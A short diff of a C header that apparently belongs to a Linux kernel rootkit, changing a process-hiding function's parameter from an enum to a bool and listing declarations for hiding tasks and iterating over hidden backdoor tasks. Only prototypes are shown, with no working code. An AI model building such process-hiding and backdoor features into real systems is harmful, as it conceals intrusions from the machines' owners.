@@ -15,8 +15,6 @@
 
 #define PROCNAME_FULL "/proc/" PROCNAME
 
-typedef enum { CHILDREN, NO_CHILDREN, WHATEVER } Operation;
-
 struct hidden_tasks {
 	struct task_struct *task;
 
@@ -101,7 +99,7 @@ char *sys_get_sslfile(void);
 bool kv_pid_init(struct kernel_syscalls *fn_addr);
 bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid);
 bool kv_find_hidden_task(struct task_struct *);
-int kv_hide_task_by_pid(pid_t, __be32, Operation);
+int kv_hide_task_by_pid(pid_t, __be32, bool);
 void kv_unhide_task_by_pid_exit_group(pid_t pid);
 bool kv_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct *, void *),
 				      void *);
